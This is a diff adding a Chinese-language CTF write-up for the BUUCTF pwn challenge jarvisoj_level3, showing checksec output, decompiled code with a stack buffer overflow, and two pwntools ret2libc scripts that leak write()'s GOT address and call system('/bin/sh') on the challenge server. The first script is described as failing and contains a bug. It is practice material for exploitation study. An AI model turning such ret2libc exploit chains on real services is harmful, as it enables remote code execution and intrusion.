@@ -1339,6 +1339,129 @@ io.interactive()
 
 ------
 
+### [jarvisoj_level3](https://buuoj.cn/challenges#jarvisoj_level3)
+
+先`file ./level3  `查看文件类型，再`checksec --file=./level3  `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./level3
+./level3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44a438e03b4d2c1abead90f748a4b5500b7a04c7, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./level3    
+[*] '/home/tyd/ctf/pwn/buuctf/level3'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`level3`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  write(1, "Hello, World!\n", 0xEu);
+  return 0;
+}
+```
+
+双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+  write(1, "Input:\n", 7u);
+  return read(0, buf, 0x100u);
+}
+```
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。
+
+```assembly
+-00000088 ; D/A/*   : change type (data/ascii/array)
+-00000088 ; N       : rename
+-00000088 ; U       : undefine
+-00000088 ; Use data definition commands to create local variables and function arguments.
+-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
+-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
+-00000088 ;
+-00000088
+-00000088 buf             db 136 dup(?)
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008
++00000008 ; end of stack variables
+```
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。编写`Python`代码尝试使用`LibcSearcher`求解`libc`基地址，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`，然而打不通。
+
+```bash
+from pwn import *
+from LibcSearcher import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27938)
+elf = ELF('./level3')
+main_addr = elf.symbols['main']
+log.success("0x%x", main_addr)
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+payload = b'a'*(0x88+0x4) 
+payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+io.sendlineafter(b'Input:\n', payload)
+write_addr = u32(io.recv(4))
+log.info('write_address => 0x%x', write_addr)
+libc = LibcSearcher('write', write_addr)
+libcbase = write_addr - libc.dump('write')
+log.success('libcbase_address => %s', hex(libcbase))
+system_addr = libcbase + libc.dump('system')
+log.success('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.dump('str_bin_sh')
+log.success('bin_sh_address => %s', hex(bin_sh_addr))
+payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main) + p32(bin_sh_addr)
+io.recvuntil(b'Input:\n')
+io.sendline(payload)
+io.interactive()
+```
+
+用题目给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。
+
+编写`Python`代码求解，得到`flag{c999b5a3-c998-4cc5-978a-465c1bb9c00d}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27938)
+elf = ELF('./level3')
+main_addr = elf.symbols['main']
+log.success("0x%x", main_addr)
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+payload = b'a'*(0x88+0x4) 
+payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+io.sendlineafter(b'Input:\n', payload)
+write_addr = u32(io.recv(4))
+log.info('write_address => 0x%x', write_addr)
+libc = ELF('./libc/libc_32.so.6')
+libcbase = write_addr - libc.symbols['write']
+log.success('libcbase_address => %s', hex(libcbase))
+system_addr = libcbase + libc.symbols['system']
+log.success('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
+log.success('bin_sh_address => %s', hex(bin_sh_addr))
+payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
+io.sendlineafter(b'Input:\n', payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
